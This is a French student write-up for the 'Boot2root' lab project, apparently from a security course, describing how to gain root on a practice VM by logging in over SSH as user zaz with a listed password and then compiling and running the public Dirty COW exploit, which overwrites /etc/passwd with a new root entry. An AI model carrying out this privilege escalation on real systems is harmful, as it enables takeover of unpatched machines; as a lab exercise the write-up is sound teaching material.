# Boot2root
## Rendu numero 2

Dans ce projet, l'objectif est d'acquérir les privilèges root sur une VM. Afin de valider la partie obligatoire du projet, il faut obtenir les privilèges root sur le serveur en utilisant deux méthodes différentes.
Chaque méthode employée doit être accompagnée d'un compte rendu complet expliquant les différentes étapes pour devenir root sur le serveur.


## SSH ZAZ

Nous commencerons la solution 2 a partir du profil de zaz en ssh

	ssh zaz@192.168.56.107

Mot de passe :

	646da671ca01bb5d84dbb5fb2238dc8e

## Faille Dirty Cow

La vulnérabilité Dirty COW permet à un attaquant de modifier un fichier système protégé en mémoire en le rendant accessible en écriture même s'il était normalement en lecture seule. Cela peut être utilisé pour élever les privilèges d'un processus non privilégié pour devenir root.

Le nom "Dirty COW" provient du jeu de mots "copy-on-write" (copie-sur-écriture) et fait référence au fait que l'exploit exploite une condition de course (race condition) dans le mécanisme de copie-sur-écriture.

Le programme dirtycow.c genere une nouvelle ligne de mot de passe pour la remplacer dans le fichier /etc/passwd.

### Programme sur la VM

On cree un fichier via `vim` qui accueillera le code permettant d'exploiter la faille dirtycow afin de changer le mot de passe du root

	vim dirtycow.c

On colle le contenu du code (https://github.com/firefart/dirtycow/) et on compile comme ceci :

	gcc -pthread dirtycow.c -o dirty -lcrypt

On lance le programme :

	zaz@BornToSecHackMe:~$ ./dirty 
	/etc/passwd successfully backed up to /tmp/passwd.bak
	Please enter the new password: 

Ici le programme nous demande de donner un password pour notre creation d'utilisateur `root`, uid(0), euid(0).

	Complete line:
	root:rovbaUosoT2Is:0:0:pwned:/root:/bin/bash

	mmap: b7fda000

Une fois le programme terminee, on peut faire

	sudo su

et se connecter avec le nouveau mot de passe qu'on a renseignee.
Nous voila connecter en tant que root :

	root@BornToSecHackMe:/home/zaz# whoami
	root
	root@BornToSecHackMe:/home/zaz# id
	uid=0(root) gid=0(root) groups=0(root)